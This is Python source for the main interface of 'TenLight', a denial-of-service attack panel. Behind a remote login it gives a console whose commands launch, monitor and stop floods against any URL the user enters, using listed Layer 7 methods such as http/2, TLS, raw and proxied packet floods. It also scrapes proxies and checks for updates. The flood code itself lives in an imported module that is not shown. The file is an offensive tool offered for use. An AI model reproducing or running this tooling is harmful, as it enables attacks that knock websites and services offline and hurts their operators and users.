#!/usr/bin/env python3
import os
import sys
import threading
import time
from panel import DoSPanel
from tabulate import tabulate
from lib import Colors
from getpass import getpass
import requests
from lib import BingSearch

def BANNER():
    nasa = """
                                                     ___
                                                  ,o88888
                                               ,o8888888'
                         ,:o:o:oooo.        ,8O88Pd8888"
                     ,.::.::o:ooooOoOoO. ,oO8O8Pd888'"
                   ,.:.::o:ooOoOoOO8O8OOo.8OOPd8O8O"
                  , ..:.::o:ooOoOOOO8OOOOo.FdO8O8"    INFO
                 , ..:.::o:ooOoOO8O888O8O,COCOO"      ───────────────── 
                , . ..:.::o:ooOoOOOO8OOOOCOCO"        CNC      : No
                 . ..:.::o:ooOoOoOO8O8OCCCC"o         Version  : 1.0.3#dev
                    . ..:.::o:ooooOoCoCCC"o:o         Author   : @adjidev   
                    . ..:.::o:o:,cooooCo"oo:o:
                 `   . . ..:.:cocoooo"'o:o:::'           
                 .`   . ..::ccccoc"'o:o:o:::'              {1.0.3}#dev          
                :.:.    ,c:cccc"':.:.:.:.:.'  _____         __    _     _   _   
              ..:.:"'`::::c:"'..:.:.:.:.:.'  |_   _|___ ___|  |  |_|___| |_| |_ 
            ...:.'.:.::::"'    . . . . .'      | | | -_|   |  |__| | . |   |  _| #Beta Edition
           .. . ....:."' `   .  . . ''         |_| |___|_|_|_____|_|_  |_|_|_|   
         . . . ...."'                                              |___|        
         .. . ."'     -DoS-              ─────────────────────────────────────────────
\n"""
    return print(Colors.sky_blue + nasa + Colors.reset)


def cls():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


class Fetch:
    @staticmethod
    def get(url):
        return requests.get(url)

    @staticmethod
    def post(url, data=None):
        return requests.post(url, data=data)


def Loading():
    bapakLu = [
        f"[{Colors.gr}#{Colors.reset}=========] 10%",
        f"[{Colors.gr}##{Colors.reset}========] 20%",
        f"[{Colors.gr}###{Colors.reset}=======] 30%",
        f"[{Colors.gr}####{Colors.reset}======] 40%",
        f"[{Colors.gr}#####{Colors.reset}=====] 50%",
        f"[{Colors.gr}######{Colors.reset}====] 60%",
        f"[{Colors.gr}#######{Colors.reset}===] 70%",
        f"[{Colors.gr}########{Colors.reset}==] 80%",
        f"[{Colors.gr}#########{Colors.reset}=] 90%",
        f"[{Colors.gr}##########{Colors.reset}] 100%",
    ]

    for step in bapakLu:
        sys.stdout.write("\r" + step)
        sys.stdout.flush()
        time.sleep(0.1)
    print()


def MyIp():
    try:
        c = requests.get("http://ifconfig.me/ip")
        if c.status_code == 200:
            return c.text.strip()
        else:
            return None
    except requests.exceptions as e:
        # print(e)
        return None


class MENU:
    df_data = [
        ["menu", "help", "show this menu"],
        ["fire", "attack", "launch DoS attack"],
        ["method", "methods", "show DoS method"],
        ["clear", "cls", "clear terminal"],
        ["ongoing", "monitor", "show ongoing attack"],
        ["myip", "-", "show your public ip"],
        ["upproxy", "updateproxy", "update current proxy"],
        ["search", "cari", "search from browser"],
        ["checkhttp", "httpcheck", "perform http check"],
        ["credit", "credits", "credit of developer"]
    ]
    
    mtd_data = [
        ["httpx", "layer 7", "send high http/2 packets"],
        ["god", "layer 7", "send high http/2 packets"],
        ["tls", "layer 7", "send high volume tls packets"],
        ["raw", "layer 7", "send high volume raw http packets"],
        ["proxy", "layer 7", "send proxied http raw packets"],
        ["storm", "layer 7", "send mixed raw/proxy packets"],
        ["strike", "layer 7", "send high volume http requests"],
        ["glory", "layer 7", "send high http/2 packets"],
    ]
    
    cred_data = [
        ["adjidev", "chatgpt"],
        ["adjisan", "youtube"],
        ["-", "stackoverflow"]
    ]

    def menu(self):
        headers = ["NAME", "ALIAS", "DESCRIPTION"]
        table = tabulate(self.df_data, headers, tablefmt="pipe", stralign="center")
        print(Colors.sky_blue + table + Colors.reset)

    def methods(self):
        headers = ["METHOD", "TYPE", "DESCRIPTION"]
        table = tabulate(self.mtd_data, headers, tablefmt="pipe", stralign="center")
        print(Colors.sky_blue + table + Colors.reset)

    def credits(self):
        headers = ["CREATOR", "THANKS TO"]
        table = tabulate(self.cred_data, headers, tablefmt="pipe", stralign="center")
        print(Colors.sky_blue + table + Colors.reset)

class MAIN:
    @staticmethod
    def Interface(username):
        cls()  
        BANNER()  
        processes = []  
        while True:
            try:
                x = input(f"[{Colors.sky_blue}{username}@tenlight{Colors.reset}]:~# ")
                args = x.split()
                if not args:
                    continue
                
                if args[0] == "menu" or args[0] == "help":
                    menunya = MENU()  
                    menunya.menu() 
                
                elif args[0] == "fire" or args[0] == "attack":
                    if len(args) < 4:
                        print(f"Usage: {args[0]} <url> <duration> <method>")
                        print(f"Example: {args[0]} https://www.ailibytes.xyz 60 raw")
                        continue
                    target = args[1]  
                    duration = args[2] 
                    method = args[3]
                    process = DoSPanel.RunAttack(target, duration, method) 
                    processes.append(process) 
                
                elif args[0] == "ongoing" or args[0] == "monitor":
                    if processes:
                        DoSPanel.ListRunningAttack()  
                    else:
                        print("No ongoing attacks.")
                
                elif args[0] == "stopall" or args[0] == "terminate":
                    if processes:
                        print("Terminating all ongoing attacks...")
                        for p in processes:
                            DoSPanel.TerminateAttack(p)  
                        processes.clear() 
                    else:
                        print("No attacks to terminate.")
                
                elif args[0] == "httpcheck" or args[0] == "checkhttp":
                    if len(args) < 2:
                        print(f"Usage: {args[0]} <url>")
                        continue
                    url = args[1]
                    os.system(f"python bin/checkhost.py {url}")
                
                elif args[0] == "myip":
                    ip = MyIp()
                    print(f"{ip}")
                
                elif args[0] == "search" or args[0] == "cari":
                    if len(args) < 2:
                        print(f"Usage: {args[0]} <query>")
                        continue
                    q = args[1]
                    bi = BingSearch(q, max_pages=10)
                    sf = bi.search()
                    bi.GetResult(sf)
                
                elif args[0] == "exit" or args[0] == "quit":
                    confirm = input("Are you sure you want to quit? (y/N) => ")
                    if confirm in ['y', 'Y']:
                        print("Quitting the program and all processes are successfully terminated!")
                        sys.exit(0)
                    else:
                        continue 
                
                elif args[0] == "method" or args[0] == "methods":
                    metotnya = MENU()
                    metotnya.methods()
                
                elif args[0] == "credit" or args[0] == "credits":
                    cr = MENU()
                    cr.credits()
                
                elif args[0] == "cls" or args[0] == "clear":
                    cls()

                elif args[0] == "upproxy" or args[0] == "updateproxy":
                    os.system("node bin/scrape.js")
                
                else:
                    print(f"\"{x}\" Not found. Type \"help\" for available commands.")
            
            except KeyboardInterrupt:
                print("\nUser interrupted the program. Exiting... Goodbye!")
                sys.exit(0)
                
    @staticmethod
    def Login(usr: str):
        passwd = getpass(f"{Colors.ylw}Password{Colors.reset} => ")

        p = Fetch.get("https://api.ailibytes.xyz/tenlight/packages/password")
        u = Fetch.get("https://api.ailibytes.xyz/tenlight/packages/username")

        if p.status_code == 200 and u.status_code == 200:
            passwords = p.text.splitlines()
            users = u.text.splitlines()

            if usr in users:
                idx = users.index(usr)
                if passwd == passwords[idx]:
                    print("Login successful!\n")
                    return True
                else:
                    print("Incorrect password.")
            else:
                print("Username not found.")
        else:
            print("Something went wrong!")
        return False

    @staticmethod
    def Version():
        ver = requests.get("https://api.ailibytes.xyz/tenlight/packages/version")
        if ver.status_code == 200:
            info = ver.json()
            up = info.get("version")
            lu = info.get("last_update")
            curr_ver = "1.0.0"

            if curr_ver != up:
                print(
                    f"{Colors.rd}TenLight script is outdated! Please update to the latest version.{Colors.reset}\n{Colors.gr}New version {Colors.reset}=> {up}\n{Colors.gr}Last Update{Colors.reset} => {lu}"
                )
                sys.exit()
        else:
            print(f"Something went wrong")
            sys.exit(1)


if __name__ == "__main__":
    try:
        Loading()
        cls()
        MAIN.Version()

        usr = input(f"{Colors.ylw}Username{Colors.reset} => ")
        if MAIN.Login(usr):
            Loading()
            monitor_thread = threading.Thread(target=DoSPanel.MonitorAttacks, daemon=True)
            monitor_thread.start()
            MAIN.Interface(usr)
        else:
            print("Exiting...")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\nProgram interrupted by user.")
        sys.exit(0)